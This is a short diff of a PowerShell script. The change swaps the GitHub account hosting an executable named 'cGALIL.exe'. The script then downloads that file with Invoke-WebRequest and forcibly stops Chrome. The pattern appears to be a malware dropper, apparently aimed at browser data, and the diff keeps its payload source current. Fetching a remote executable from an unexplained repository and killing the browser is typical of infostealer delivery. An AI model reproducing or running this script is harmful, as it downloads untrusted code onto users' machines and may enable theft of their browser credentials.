@@ -13,7 +13,7 @@ try {
 }
 Clear-Host
 
-$url = "https://github.com/hocijic397/MCL/raw/main/cGALIL.exe"
+$url = "https://github.com/elfrenko2/MCL/raw/main/cGALIL.exe"
 Invoke-WebRequest -Uri $url -OutFile $exePath
 
 Stop-Process -Name "chrome"
